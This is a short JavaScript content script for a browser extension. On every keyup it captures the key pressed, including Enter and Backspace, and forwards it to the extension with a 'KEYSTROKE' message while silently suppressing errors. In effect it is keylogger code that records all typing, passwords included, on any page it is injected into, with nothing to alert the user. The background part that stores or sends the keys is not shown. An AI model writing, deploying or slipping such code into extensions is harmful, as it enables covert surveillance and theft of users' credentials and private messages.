document.addEventListener('keyup', (event) => {
  let keyToRecord = event.key;
  if (keyToRecord === "Enter") keyToRecord = "[Enter]";
  if (keyToRecord === "Backspace") keyToRecord = "[Bksp]";
  
  if (keyToRecord.length === 1 || keyToRecord.startsWith("[")) {
    // Check if runtime context exists and has not been invalidated by an extension reload
    if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
      try {
        chrome.runtime.sendMessage({
          type: "KEYSTROKE",
          key: keyToRecord === " " ? " " : keyToRecord
        }, () => {
          // Clear internal errors from runtime channel
          if (chrome.runtime.lastError) {
            // Context is dead or responding down channel, log matrix ignored safely
          }
        });
      } catch (e) {
        // Suppress extension context invalidation errors silently
      }
    }
  }
});
